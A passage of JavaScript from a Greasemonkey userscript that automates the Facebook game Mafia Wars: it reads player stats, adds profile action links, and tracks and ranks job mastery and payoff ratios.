function getPlayerEquip() {
  // Make sure we're on the fight tab.
  if (!onFightTab() && !onInventoryTab() && !onLootTab()) return;

  var eltAttackStrength = xpathFirst('.//div[@class="fightbar_group_stat"]//img[contains(@alt, "Mafia Attack Strength")]', innerPageElt);
  if (eltAttackStrength) { prevAttackEquip = curAttackEquip; curAttackEquip = parseInt(eltAttackStrength.parentNode.childNodes[1].nodeValue.replace(',', '')); GM_setValue('curAttackEquip', curAttackEquip); }
  var eltDefenseStrength = xpathFirst('.//div[@class="fightbar_group_stat"]//img[contains(@alt, "Mafia Defense Strength")]', innerPageElt);
  if (eltDefenseStrength) { prevDefenseEquip = curDefenseEquip; curDefenseEquip = parseInt(eltDefenseStrength.parentNode.childNodes[1].nodeValue.replace(',', '')); GM_setValue('curDefenseEquip', curDefenseEquip); }

  if (isUndefined(curAttackEquip) || isUndefined(curDefenseEquip)) {
    DEBUG('Current equipment attributes cannot be detected.');
  } else
    DEBUG('Fetched equipment stats.');
}

function customizeProfile() {
  // Make sure we're on a profile.
  var statsTable = xpathFirst('.//td[@class="stats_left"]', innerPageElt);
  if (!statsTable) return false;

  // Fetch Player Stats
  getPlayerStats();

  // FIXME: Need to rewrite buildAnchor, need to make it more flexible
  this.buildAnchor = function (Options) {
    //Options.URLSegment = common portions if URL
    //Options.href = allow for full control of href
    //Options.clickEvent = function
    //Options.title = flyout text
    //Options.AnchorText = text inside Anchor
    var buildAnchorOptions = {};
    if(Options.URLSegment){
      buildAnchorOptions.href='http://mwfb.zynga.com/mwfb/remote/html_server.php?'+Options.URLSegment;
    } else if(Options.href){
      buildAnchorOptions.href = Options.href;
    } else {
      buildAnchorOptions.href='#';
    }
    if(!Options.clickEvent && Options.URLSegment){
      buildAnchorOptions.onclick ='return do_ajax(\'inner_page\', \'/remote/html_server.php?'+Options.URLSegment+'\', 1, 1, 0, 0); return false; ';
    }
    if(Options.id){
      buildAnchorOptions.id=Options.id;
    }

    var anchorElt = makeElement('a', statsDiv, buildAnchorOptions);
    if(Options.AnchorText){
      anchorElt.appendChild(document.createTextNode(Options.AnchorText));
    }
    if(Options.clickEvent){
      anchorElt.addEventListener('click', Options.clickEvent, false);
    }
    return anchorElt;
  };

  var statsDiv = xpathFirst('.//a[contains(., "Sucker Punch")]/..', innerPageElt);
  if (statsDiv) {
    // On another player's profile page. Add extra options.
    var tabElt = xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(text(), "Profile")]', innerPageElt);
    if (tabElt){
      var remoteuserid;
      var remotefbid;
      var tmpKey;
      var cbKey;
      if (tabElt.getAttribute('onclick').match(/tmp=([\d,a-z]+)&cb=([\d,a-z]+)&user=p\|(\d+)/)) {
        tmpKey = 'tmp='+RegExp.$1+'&';
        cbKey = 'cb='+RegExp.$2+'&';
        remoteuserid = 'p|'+RegExp.$3;
      }
      if (!remoteuserid && tabElt.getAttribute('onclick').match(/user=p\|(\d+)/)){
        remoteuserid = 'p|'+RegExp.$1;
      }

      // This code is to grab the facebook id for this profile
      if ((m=/xw_controller=robbingtarget.+?target=([0-9]+)/.exec(document.getElementById('inner_page').innerHTML))) {
        remotefbid = m[1];
      }
      if ((m=/xw_action=gift_wishlist.*?user=([0-9]+)/.exec(document.getElementById('inner_page').innerHTML))) {
        remotefbid = m[1];
      }
      // Sometimes the friend_id of the new vegasslots is in the fb id format:
      if (!remotefbid && (m=/xw_controller=VegasSlots.+?friend_id=([0-9]+)/i.exec(document.getElementById('inner_page').innerHTML))) {
        remotefbid = m[1];
      }

      if (!tmpKey && tabElt.getAttribute('onclick').match(/tmp=([\d,a-z]+)&/)){
        tmpKey = 'tmp='+RegExp.$1+'&';
      }
      if (!cbKey && tabElt.getAttribute('onclick').match(/cb=([\d,a-z]+)&/)){
        cbKey = 'cb='+RegExp.$2+'&';
      }

      DEBUG('Profile: Mafia Wars ID: ' + remoteuserid + ' Facebook ID: ' + remotefbid);
      var userid = remoteuserid.replace('p|','');

      // See if this player is in our mafia.
      var removeElt = xpathFirst('.//a[contains(., "Remove from Mafia")]', statsDiv);

      // Show if Alive/Dead
      if (!running && !removeElt) {
        var titleElt = xpathFirst('./div[@class="title"]', innerPageElt);
        if (titleElt) {
          titleElt.setAttribute('style', 'background: black;');

        }
        var ajaxID = createAjaxPage(false, 'icecheck profile', titleElt);
		    var elt = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
		    var iceCheckElt = makeElement('a', null,null);
		    var newClick = elt.getAttribute('onclick');
        newClick  = newClick.replace('inner_page',ajaxID);
		    iceCheckElt.setAttribute('onclick', newClick);
		    clickElement(iceCheckElt);
      }
      // Don't continue if buttons already there
      if (document.getElementById('where_are_my_links')) return true;

      var rDisplay = false;

      // Explain the buttons
      makeElement('a', statsDiv, {'id':'where_are_my_links', 'href':'javascript:alert("Due to the way Mafia Wars links to Facebook there are times where PS MWAP cannot find the Facebook profile ID. In those situations PS MWAP will not display buttons that require that ID. You can make the Facebook ID available by refreshing the profile page.");'}).appendChild(document.createTextNode('Where are my links?'));

      // This is a refresh page button
      statsDiv.appendChild(document.createTextNode(' | '));
      makeElement('a', statsDiv, {'href':'http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=stats&xw_action=view&xw_city=1&user=' + remoteuserid}).appendChild(document.createTextNode('Refresh this profile!'));
      rDisplay = true;

      if (remotefbid) {
        // Facebook profile
        if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
        makeElement('a', statsDiv, {'href':'http://www.facebook.com/profile.php?id=' + remotefbid,'target':'_blank'}).appendChild(document.createTextNode('Facebook Profile'));
        statsDiv.appendChild(document.createTextNode(' | '));

        // Add as Facebook friend
        makeElement('a', statsDiv, {'href':'http://www.facebook.com/addfriend.php?id=' + remotefbid,'target':'_blank'}).appendChild(document.createTextNode('Add as Friend'));
        rDisplay = true;
      }

      if (removeElt) { // Promote
        if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
        //href Example:http://mwfb.zynga.com/mwfb/remote/html_server.php?xw_controller=group&xw_action=view&xw_city=4&tmp=9c2d83eaf30b28fa29319feb437e4f7e&cb=18309240931265744553&promote=yes&uid=48608018
        //OnClick Example: return do_ajax('inner_page', 'remote/html_server.php?xw_controller=group&xw_action=view&xw_city=4&tmp=9c2d83eaf30b28fa29319feb437e4f7e&cb=18309240931265744553&promote=yes&uid=48608018', 1, 1, 0, 0); return false;
        this.buildAnchor( { 'AnchorText':'Promote',
                            'URLSegment': 'xw_controller=group&'+
                                          'xw_action=view&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'promote=yes&'+
                                          'pid=' + remoteuserid});
        rDisplay = true;
      }
      if (rDisplay) makeElement('br', statsDiv,{});
      rDisplay = false;

      if (removeElt) {//Add or Remove from War List
        var isOnWarList = (getSavedList('autoWarTargetList').indexOf(userid) != -1);
        // In my mafia. Show options to add/remove from war list.
        this.buildAnchor( { 'AnchorText':isOnWarList?'Remove from War List':'Add to AutoWar List',
                            'id':userid,
                            'title':'In the settings box, under the mafia tab\nIf you have selected war friends from a list\nupdates the friends ids in the box',
                            'clickEvent':isOnWarList?clickWarListRemove:clickWarListAdd
                          });
        rDisplay = true;
      }

      // Add to AutoHitlist
      if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
      var isOnAutoHitList = (getSavedList('pautoHitOpponentList').indexOf(userid) != -1);
      this.buildAnchor( { 'AnchorText':isOnAutoHitList?'Remove from AutoHit List':'Add to AutoHit List',
                          'id':userid,
                          'title':'In the settings box, under the stamina tab\nIf you have selected hitlist opponents \nHitlist these opponents:',
                          'clickEvent':isOnAutoHitList?clickAutoHitListRemove:clickAutoHitListAdd
                        });
      rDisplay = true;

      if (!removeElt) {// Not in mafia. Show options to add/remove from fight lists.
        if (rDisplay) statsDiv.appendChild(document.createTextNode(' | '));
        rDisplay = true;
        var isOnFightList = (getSavedList('pfightlist').indexOf(userid) != -1);
        this.buildAnchor( { 'AnchorText':isOnFightList?'Remove from Fight List':'Add to AutoFight List',
                            'id':userid,
                            'title':'In the settings box, under the stamina tab\nIf you have selected fight specific opponents\nFight these opponents:',
                            'clickEvent':isOnFightList?clickFightListRemove:clickFightListAdd
                          });
        }


      if (rDisplay) makeElement('br', statsDiv,{});

      if (removeElt){//Job Help
        this.buildAnchor( { 'AnchorText':'NY - Give help',
                            'URLSegment': 'xw_controller=job&'+
                                          'xw_action=give_help&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=1'
                          });
        statsDiv.appendChild(document.createTextNode(' | '));
        this.buildAnchor( { 'AnchorText':'Cuba - Give help',
                            'title':'A test of the title',
                            'URLSegment': 'xw_controller=job&'+
                                          'xw_action=give_help&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=2'
                          });
        statsDiv.appendChild(document.createTextNode(' | '));
        this.buildAnchor( { 'AnchorText':'Moscow - Finish Episode ',
                            'URLSegment': 'xw_controller=episode&'+
                                          'xw_action=give_help_moscow_boss&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=3'
                          });
        statsDiv.appendChild(document.createTextNode(' | '));
        this.buildAnchor( {'AnchorText':'Bangkok - Give help',
                            'URLSegment': 'xw_controller=story&'+
                                          'xw_action=give_help_social&'+
                                          'xw_city=' + (city + 1) + '&'+
                                          tmpKey+
                                          cbKey+
                                          'target_id='+remoteuserid+'&'+
                                          'job_city=4'
                          });
        makeElement('br', statsDiv,{});
        if (remotefbid) {
          this.buildAnchor( { 'AnchorText':'Mafia Gift',
                            'title':'Requires that you set the giftkey in advance, see documentation',
                            'href':'http://www.spockholm.com/mafia/?id='+remotefbid
                          });
          statsDiv.appendChild(document.createTextNode(' | '));
        }
        this.buildAnchor( { 'AnchorText':'Load ChuckACrap',
                            'title':'From spockholm.com',
                            'clickEvent':eventclick_chuckaCrap
                          });
      }
    }
  } else {
    // On our own profile page.
    profileFix();
  }
  return true;
}

// Return the job mastery level
function getJobMastery(jobRow, newJobs) {
  // Logic for new job layout
  if (newJobs) {
    var mastery = 100;
    if(isJobFight(jobRow )&& (isGMChecked('skipfight') ) ) {
//      DEBUG('fight job marking- 100 %- ');
      return 100;
    } else {
//      DEBUG('not fight job.');
    }
    if (jobRow.innerHTML.untag().match(/>(\d+)%\s+Job\s+Mastery/i) || jobRow.innerHTML.untag().match(/(\d+)%/i) || jobRow.innerHTML.match(/Job\s+Mastery\s+(\d+)%/i) || jobRow.innerHTML.match(/>(\d+)%/i)) { mastery = parseInt(RegExp.$1); }
    else { if (jobRow.innerHTML.untag().match(/margin-right:\s+(\d+)%/i)) mastery = 100-parseInt(RegExp.$1) }
    return mastery;
  }

  // Locked jobs are mastered too
  if(/Mastered/i.test(jobRow.innerHTML) || isJobLocked(jobRow)) {
    return 100;
}  else if (jobRow.innerHTML.match(/Job\s+Mastery\s+(\d+)%/i) || jobRow.innerHTML.match(/>(\d+)%/i))
    return parseInt(RegExp.$1);

  // Get the job with the highest percentage in choice point jobs
  var divElts = $x('.//td[@class="job_name job_no_border"]//div[contains(text(),"%")]', jobRow);
  if (divElts) {
    var iLength = divElts.length;
    var masteryPct = (iLength == 1) ? 100 : 0;
    for (var i = 0; i < iLength; ++i) {
      if (divElts[i].innerHTML.match(/(\d+)%/) && parseInt(RegExp.$1) > masteryPct)
        masteryPct = parseInt(RegExp.$1);
    }
    return parseInt(masteryPct);
  }
  DEBUG('No mastery items found. Assuming 0% mastery level.');
  return 0;
}

// Set the next job to be mastered for mastery job options
function jobMastery(element, newJobs) {
  if (isGMChecked('repeatJob')) return;

  var selectMission = parseInt(GM_getValue('selectMission', 1));
  var currentJob = missions[selectMission][MISSION_NAME];
  var jobno      = missions[selectMission][MISSION_NUMBER];
  var tabno      = missions[selectMission][MISSION_TAB];
  var cityno     = missions[selectMission][MISSION_CITY];

  if (city != cityno || !onJobTab(tabno)) return;

  var currentJobRow = getJobRow(currentJob, element);

  // Calculate tier mastery.
  var tierLevel = 0;
  var jobPercentComplete = -1;
  if (currentJobRow) jobPercentComplete = getJobMastery(currentJobRow, newJobs);
  DEBUG('Job is '+jobPercentComplete+' % complete');
  var currentJobMastered = (jobPercentComplete == 100);
  if (currentJobRow) {
    if (newJobs && currentJobRow.className.match(/mastery_level_(\d+)/i))
      tierLevel = RegExp.$1;
    else if (currentJobRow.innerHTML.match(/level (\d+)/i))
      tierLevel = RegExp.$1;
  }

  var tierPercent = 0;
  var jobCount = 0;
  var firstUnmastered = selectMission;
  var firstFound = false;
  for (var i = 0, iLength = missions.length; i < iLength; i++) {
    // Only get the jobs from this city tier
    if (city == missions[i][MISSION_CITY] && tabno == missions[i][MISSION_TAB]) {
      var thisJobRow = getJobRow(missions[i][MISSION_NAME]);
      if (thisJobRow) {
        var masteryLevel = getJobMastery(thisJobRow, newJobs);
        DEBUG('Masterylevel '+missions[i][MISSION_NAME]+' : '+masteryLevel);
        if ( (isGMChecked('skipfight') && !isJobFight(thisJobRow) ) || !isGMChecked('skipfight') ) {
          tierPercent += masteryLevel;
          jobCount++;
          // Get the first unmastered job on this tier
          if (!firstFound && masteryLevel < 100) {
            firstFound = true;
            firstUnmastered = i;
            DEBUG('firstUnmastered job is '+missions[i][MISSION_NAME]);
          }
        }
      }
    }
  }

  if (jobCount > 0) {
    tierPercent = Math.floor(tierPercent / jobCount);
  }

  if (GM_getValue('tierCompleteStatus') != tierLevel + '|' + tierPercent) {
    GM_setValue('tierCompleteStatus', tierLevel + '|' + tierPercent);
    addToLog('info Icon', 'Job tier level ' + tierLevel + ' is ' +
             tierPercent + '% complete.');
  }

  // Calculate job mastery
  DEBUG("Checking current job mastery.");
  if (currentJobMastered || jobPercentComplete == -1) {
    var jobList = getSavedList('jobsToDo');
    if (jobList.length == 0) {
      DEBUG("There are no more jobs in the to-do list.");
      if (currentJobMastered) addToLog('info Icon', 'You have mastered <span class="job">' + currentJob + '</span>.');
      else addToLog('info Icon', 'Job <span class="job">' + currentJob + '</span> is not available.');

//      if (tierPercent == 100) {
//newchange allow progression to next tier if skipping stamina jobs
      if ( (tierPercent == 100) || (isGMChecked('skipfight')) ) {
        // Find the first job of the next tier.
        // NOTE: This assumes that the missions array is sorted by city and then by tier.
        var nextTierJob;
        for (i = selectMission + 1, iLength=missions.length; i < iLength; ++i) {
          if (missions[i][MISSION_CITY] != cityno) {
            nextTierJob = i;
            addToLog('info Icon', 'You have mastered the final job tier in ' +
                     cities[cityno][CITY_NAME] + '! Moving to the next tier in ' +
                     cities[missions[nextTierJob][MISSION_CITY]][CITY_NAME] + '.');
            break;
          }
          if (missions[i][MISSION_TAB] != tabno) {
            nextTierJob = i;
            addToLog('info Icon', 'Current job tier is mastered. Moving to next tier in ' + cities[cityno][CITY_NAME] + '.');
            break;
          }
        }
        if (!nextTierJob) {
          addToLog('info Icon', 'You have mastered all jobs!');
        } else {
          GM_setValue('selectMission', nextTierJob);
          addToLog('info Icon', 'Job switched to <span class="job">' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '</span>.');
        }
      } else {
          GM_setValue('selectMission', firstUnmastered);
          addToLog('info Icon', 'Job switched to <span class="job">' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '</span>.');
      }
    } else {
      DEBUG("There are jobs in the to-do list.");
    }
  } else {
    DEBUG("Job is not mastered. Checking percent of mastery.");
    if (GM_getValue('jobCompleteStatus') != (currentJob + '|' + String(jobPercentComplete))) {
      GM_setValue('jobCompleteStatus', (currentJob + '|' + String(jobPercentComplete)));
      addToLog('info Icon', '<span class="job">' + currentJob + '</span> is ' + jobPercentComplete + '% complete.');
    }
  }
}

function customizeVegasJobs() {
  // Handle Las Vegas / Italy job layout
  var vegasJobs = $x('.//div[@id="map_panels"]//div[contains(@class, "job_info")]', innerPageElt);

  if (!vegasJobs || vegasJobs.length == 0) return false;
  DEBUG('Found ' + vegasJobs.length + ' new '+ cities[city][CITY_NAME] +' jobs in customize '+ cities[city][CITY_NAME] +' jobs.');

  //  6 is tab path newlv
  //  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{},6:{}})');
  //  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{},6:{}})');
  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{}})');
  try {
    availableJobs = eval('(' + GM_getValue('availableJobs') + ')');
    masteredJobs = eval('(' + GM_getValue('masteredJobs') + ')');
  } catch (ex) {
    // ignore
  }
  var currentTab = currentJobTab();
  var currentTabPath = currentJobTabPath();
  availableJobs[city][currentTab] = [];
  masteredJobs[city][currentTab] = [];

  var isJobLocked = function (thisJob) {
    return (/lock/i.test(thisJob.innerHTML.untag()) || /complete/i.test(thisJob.innerHTML.untag()));
  };

  // Display an experience to energy payoff ratio for each job.
  var bestJobs = [], worstJobs = [];
  var bestRatio = 0, worstRatio = 10;
  var bestStamJobs = [], worstStamJobs = [];
  var bestStamRatio = 0, worstStamRatio = 10;
  var reselectJob = false;
  var masteryList = getSavedList('masteryJobsList');

  var masteredJobsCount = 0;
  var jobsFound = 0;

///////////////////////////////////////////////////////////////////////// start of process jobs mastery
  for (var i = 0, iLength = vegasJobs.length; i < iLength; ++i) {
    var currentJob = vegasJobs[i];
    var jobName = xpathFirst('.//div[@class="job_title"]//h3', currentJob).innerHTML.clean().trim();
    var jobCost = xpathFirst('.//div[@class="job_uses"]', currentJob);
    var jobReward = xpathFirst('.//div[@class="job_pays"]', currentJob);
    var jobAction = xpathFirst('.//a', currentJob);
    // Skip jobs not in missions array
    var jobMatch = missions.searchArray(jobName, 0)[0];
    if (isNaN(jobMatch)) {
      //if (!jobName.match(/Boss/i)) addToLog('search Icon', jobName + ' not found in missions array. ');
      if (!jobName.match(/Boss/i)) DEBUG(jobName + ' not found in missions array. ');
      continue;
    }

    jobsFound++;
    var jobPercentage = getJobMastery(currentJob, true);

    // Determine available jobs
    if (jobPercentage == 100) {
      if (masteryList.length > 0 && masteryList.indexOf(String(jobMatch)) != -1)  masteredJobs[city][currentTab].push(jobMatch);
      masteredJobsCount++;
    }

    //ignore job if we have do not have enough energy / stamina to perform the job, otherwise we set jobmastery to 100 to skip this job temporarely
    var skipCurrentJob = false;
    stamElt = xpathFirst('.//dd[@class="stamina"]', currentJob);
    if(stamElt) {
      reqStam = parseInt(stamElt.innerHTML.untag());
      if(reqStam > stamina) {
        skipCurrentJob = true;
        DEBUG('Required Stamina: ' +reqStam+' - Current Stamina: '+stamina+'. Skipping');
      }
    }

    nrgElt = xpathFirst('.//dd[@class="energy"]', currentJob);
    if(!nrgElt) nrgElt = xpathFirst('.//td[@class="job_energy"]', currentJob);
    if(nrgElt) {
      reqNrg = parseInt(nrgElt.innerHTML.untag());
      if(reqNrg > energy) {
        skipCurrentJob = true;
        DEBUG('Required Energy: ' +reqNrg+' - Current Energy: '+energy+'. Skipping');
      }
    }

    // Skip locked jobs and optional fight jobs - more debugging since it seems to cause some troubles
    if(isJobLocked(currentJob) || skipCurrentJob) {
      if(isJobLocked(currentJob)) DEBUG('Skipping Job ' + jobName + ' (' + jobMatch + ') : locked.');
      if(skipCurrentJob) DEBUG('Skipping Job ' + jobName + ' (' + jobMatch + ') : lack of energy/stamina.');
// FIXME: mark job mastered instead of skipping it so we can progress to the next tier
      //if(isGMChecked('skipfight') && isJobFight(currentJob)) {
      //   DEBUG('Skipping Job ' + jobName + ' (' + jobMatch + ') : skipping LV & Italy fight jobs.');
      //}
    }
    else {
      availableJobs[city][currentTab].push(jobMatch);
    }

    // Skip this for jobs without jobCost
    if (!jobCost) continue;

    // Skip this for jobs without cost
    var costElt = xpathFirst('.//dd[@class="energy"]', jobCost);
    if (!costElt) costElt = xpathFirst('.//dd[@class="stamina"]', jobCost);
    if (!costElt) continue;
    var cost = parseCash(costElt.innerHTML);

    // Is this a boss or fight job?
    var isBossJob = xpathFirst('.//div[@class="job_ribbon ribbon_boss"]', currentJob);
    var isFightJob = xpathFirst('.//div[@class="job_ribbon ribbon_fights"]', currentJob);

    var expElt = xpathFirst('.//dd[@class="experience"]', jobReward);
    if (expElt) var reward = parseInt(expElt.innerHTML);
    else var reward = 0;
    var moneyElt = xpathFirst('.//dd[@class="vegas_cash_icon"]', jobReward);

    var ratio = Math.round (reward / cost * 100) / 100;
    var xpTxt = ' (' + ratio + ')'; //original
 //   var xpTxt = ' ' + reward + ' (' + ratio + ')';

    // Money payout ratio
    var moneyTxt = '';
    if (moneyElt) {
      var money = parseCash(moneyElt.innerHTML.untag());
      var mratio = makeCommaValue(Math.round(money / cost));
      moneyTxt = ' (' + mratio + ')';
    }
    // Calculate time left for each job
    var timePerEnergy = isGMChecked('isManiac') ? 3 : 5;
    timePerEnergy = isGMChecked('hasHelicopter') ? timePerEnergy - .5: timePerEnergy;
    timePerEnergy = isGMChecked('hasGoldenThrone') ? timePerEnergy/2: timePerEnergy;

    var timeTxt = ' Time: 0 min';
    if (cost > energy) timeTxt = 'Time: ' + getDecimalTime((cost - energy) * timePerEnergy);

    if (!xpathFirst('.//span[@id="ratio_xp"]', expElt))
      makeElement('span', expElt, {'id':'ratio_xp', 'style':'color:red; font-size: 10px'}).appendChild(document.createTextNode(xpTxt));
    if (!xpathFirst('.//span[@id="ratio_money"]', moneyElt))
      makeElement('span', moneyElt, {'id':'ratio_money', 'style':'color:red; font-size: 10px'}).appendChild(document.createTextNode(moneyTxt));

    updateJobInfo(jobMatch, cost, reward, ratio);

    if (!isFightJob) {
      // Keep track of the best & worst payoffs for energy jobs.
      if (ratio > bestRatio) {
        bestRatio = ratio;
        bestJobs = [costElt];
      } else if (ratio == bestRatio)
        bestJobs.push(costElt);
      if (ratio < worstRatio) {
        worstRatio = ratio;
        worstJobs = [costElt];
      } else if (ratio == worstRatio)
        worstJobs.push(costElt);
    } else {
      // Keep track of the best & worst payoffs for stamina jobs.
      if (ratio > bestStamRatio) {
        bestStamRatio = ratio;
        bestStamJobs = [costElt];
      } else if (ratio == bestStamRatio)
        bestStamJobs.push(costElt);
      if (ratio < worstStamRatio) {
        worstStamRatio = ratio;
        worstStamJobs = [costElt];
      } else if (ratio == worstStamRatio)
        worstStamJobs.push(costElt);
    }
  }

  var elt;
  // Highlight the best and worst energy jobs.
  if (worstRatio != bestRatio) {
    while (bestJobs.length) {
      elt = bestJobs.pop();
      if (!xpathFirst('.//span[@id="job_best"]', elt)) {
        elt = makeElement('span', elt, {'id':'job_best', 'style':'color:#52E259; font-size: 10px'});
        elt.appendChild(document.createTextNode(' (BEST)'));
      }
    }
    while (worstJobs.length) {
      elt = worstJobs.pop();
      if (!xpathFirst('.//span[@id="job_worst"]', elt)) {
        elt = makeElement('span', elt, {'id':'job_worst', 'style':'color:#EC2D2D; font-size: 10px'});
        elt.appendChild(document.createTextNode(' (WORST)'));
      }
    }
  }
  // Highlight the best and worst stamina jobs.
  if (worstStamRatio != bestStamRatio) {
    while (bestStamJobs.length) {
      elt = bestStamJobs.pop();
      if (!xpathFirst('.//span[@id="job_best_stam"]', elt)) {
        elt = makeElement('span', elt, {'id':'job_best_stam', 'style':'color:#52E259; font-size: 10px'});
        elt.appendChild(document.createTextNode(' (BEST STAM)'));
      }
    }
    while (worstStamJobs.length) {
      elt = worstStamJobs.pop();
      if (!xpathFirst('.//span[@id="job_worst_stam"]', elt)) {
        elt = makeElement('span', elt, {'id':'job_worst_stam', 'style':'color:#EC2D2D; font-size: 10px'});
        elt.appendChild(document.createTextNode(' (WORST STAM)'));
      }
    }
  }

  // Show the experience to energy/stamina ratios needed to level up.
  if (!document.getElementById('level_up_ratio')) {
    elt = makeElement('div', null, {'id':'level_up_ratio', 'title':'Ratios needed to level up: combined, on energy only, on stamina only.',
                                    'style':'position:absolute; top:45px; right:60px; width:80px; text-align:left; font-size:10px; display:none;'});
    var positionElt = xpathFirst('.//div[@id="job_paths"]/div[contains(@style,"clear")]', innerPageElt);
    positionElt.parentNode.insertBefore(elt, positionElt);
  }

  setLevelUpRatio();

  if(reselectJob) canMission();
  GM_setValue('availableJobs', JSON.stringify(availableJobs));
  GM_setValue('masteredJobs', JSON.stringify(masteredJobs));

  // Set the job progress
  jobMastery(innerPageElt, true);
  tierMastery(jobsFound, masteredJobsCount, currentTab);

  return true;
}

function customizeNewJobs() {
  // Handle new job layout
  var newJobs = $x('.//div[@id="new_user_jobs"]//div[contains(@class, "job clearfix")]', innerPageElt);

  if (!newJobs || newJobs.length == 0) return false;

  DEBUG('Found ' + newJobs.length + ' new jobs.');

  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{},5:{}})');
  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{},5:{}})');
  try {
    availableJobs = eval('(' + GM_getValue('availableJobs') + ')');
    masteredJobs = eval('(' + GM_getValue('masteredJobs') + ')');
  } catch (ex) {
    // ignore
  }
  var currentTab = currentJobTab();
  availableJobs[city][currentTab] = [];
  masteredJobs[city][currentTab] = [];

  // FIXME: Change this once we encounter locked jobs for the new header
  var isJobLocked = function (thisJob) {
    return (/lock/i.test(thisJob.innerHTML.untag()) || /complete/i.test(thisJob.innerHTML.untag()));
  };

  // Display an experience to energy payoff ratio for each job.
  var bestJobs = [], worstJobs = [];
  var bestRatio = 0, worstRatio = 10;
  var reselectJob = false;
  var masteryList = getSavedList('masteryJobsList');

  var masteredJobsCount = 0;
  var jobsFound = 0;
  for (var i = 0, iLength = newJobs.length; i < iLength; ++i) {
    var currentJob = newJobs[i];

    var jobName = xpathFirst('.//div[@class="title_results"]//h3', currentJob).innerHTML.clean().trim();
    var jobCost = xpathFirst('.//div[@class="use_pay"]//dl[contains(.,"Uses")]', currentJob);
    var jobReward = xpathFirst('.//div[@class="use_pay"]//dl[contains(.,"Pays")]', currentJob);
    var jobAction = xpathFirst('.//a', currentJob);

    // Skip jobs not in missions array
    var jobMatch = missions.searchArray(jobName, 0)[0];
    if (isNaN(jobMatch)) {
      //addToLog('search Icon', jobName + ' not found in missions array. ');
      DEBUG(jobName + ' not found in missions array. ');
      continue;
    }

    jobsFound++;
    var jobPercentage = getJobMastery(currentJob, true);

    // Determine available jobs
    if (jobPercentage == 100) {
      if (masteryList.length > 0 && masteryList.indexOf(String(jobMatch)) != -1)
        masteredJobs[city][currentTab].push(jobMatch);
      masteredJobsCount++;

      // Skip locked jobs
      if (isJobLocked(currentJob)) {
        DEBUG('Job ' + jobName + '(' + jobMatch + ') is locked. Skipping.');
      } else {
        availableJobs[city][currentTab].push(jobMatch);
      }
    }

    // Skip this for jobs without jobCost
    if (!jobCost) continue;

    // Skip this for jobs without cost
    var costElt = xpathFirst('.//dd[@class="energy"]', jobCost);
    if (!costElt) continue;
    var cost = parseCash(costElt.innerHTML);

    var expElt = xpathFirst('.//dd[@class="experience"]', jobReward);
    if (expElt)
      var reward = parseInt(expElt.innerHTML);
    else
      var reward = 0;

    var moneyElt = xpathFirst('.//dd[@class="cash cash_'+cities[city][CITY_ALIAS]+'"]', jobReward);

    // XP payout ratio
    var ratio = Math.round(reward / cost * 100) / 100;
    var xpTxt = 'XP: ' + ratio + 'x';

    // Money payout ratio
    var moneyTxt = '';
    if (moneyElt) {
      var money = parseCash(moneyElt.innerHTML.untag());
      var currency = cities[city][CITY_CASH_SYMBOL];
      var mratio = makeCommaValue(Math.round(money / cost));

      moneyTxt = ', $$$: ' + currency + mratio + 'x';
    }

    // Calculate time left for each job
    var timePerEnergy = isGMChecked('isManiac') ? 3 : 5;
    timePerEnergy = isGMChecked('hasHelicopter') ? timePerEnergy - .5: timePerEnergy;
    timePerEnergy = isGMChecked('hasGoldenThrone') ? timePerEnergy/2: timePerEnergy;

    var timeTxt = ' Time: 0 min';
    if (cost > energy) timeTxt = 'Time: ' + getDecimalTime((cost - energy) * timePerEnergy);

    makeElement('span', costElt, {'style':'color:red; font-size: 10px'})
      .appendChild(document.createTextNode(' [' + xpTxt + moneyTxt + ']'));
    makeElement('span', costElt, {'style':'color:green; font-size: 10px'})
      .appendChild(document.createTextNode(timeTxt));

    updateJobInfo(jobMatch, cost, reward, ratio);

    // Keep track of the best & worst payoffs.
    if (ratio > bestRatio) {
      bestRatio = ratio;
      bestJobs = [costElt];
    } else if (ratio == bestRatio) {
      bestJobs.push(costElt);
    }
    if (ratio < worstRatio) {
      worstRatio = ratio;
      worstJobs = [costElt];
    } else if (ratio == worstRatio) {
      worstJobs.push(costElt);
    }
  }

  // Highlight the best and worst jobs.
  var elt;
  if (worstRatio != bestRatio) {
    while (bestJobs.length) {
      elt = bestJobs.pop();
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#52E259; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(yeahIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' BEST'));
    }
    while (worstJobs.length) {
      elt = worstJobs.pop();
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#EC2D2D; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' WORST'));
    }
  }

  // Show the experience to energy ratio needed to level up.
  elt = makeElement('div', null, {'id':'level_up_ratio', 'style':'text-align:center; display:none;'});
  newJobs[0].parentNode.insertBefore(elt, newJobs[0]);

  setLevelUpRatio();
  if(reselectJob) canMission();
  GM_setValue('availableJobs', JSON.stringify(availableJobs));
  GM_setValue('masteredJobs', JSON.stringify(masteredJobs));

  // Set the job progress
  jobMastery(innerPageElt, true);
